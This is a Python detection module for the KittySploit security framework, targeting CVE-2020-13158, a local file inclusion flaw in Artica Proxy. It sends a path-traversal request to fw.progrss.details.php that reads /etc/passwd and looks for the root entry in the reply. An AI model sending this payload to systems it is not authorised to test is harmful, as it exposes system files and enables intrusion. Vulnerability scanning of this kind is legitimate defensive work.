#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Artica Proxy Community Edition before 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Artica Proxy Community Edition <4.30.000000 - Local File Inclusion Detection',
        'description': 'Artica Proxy Community Edition before 4.30.000000 is vulnerable to local file inclusion via the fw.progrss.details.php popup parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'artica', 'lfi', 'articatech', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/InfoSec4Fun/CVE-2020-13158',
            'https://sourceforge.net/projects/artica-squid/files/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13158',
            'https://github.com/nomi-sec/PoC-in-GitHub',
            'https://github.com/soosmile/POC',
        ],
        'cve': 'CVE-2020-13158',
    }

    def run(self):
        r = self.http_request(method="GET", path='/fw.progrss.details.php?popup=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Artica Proxy Community Edition <4.30.000000 - Local File Inclusion detected",
                path='/fw.progrss.details.php?popup=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            )
            return True
        return False

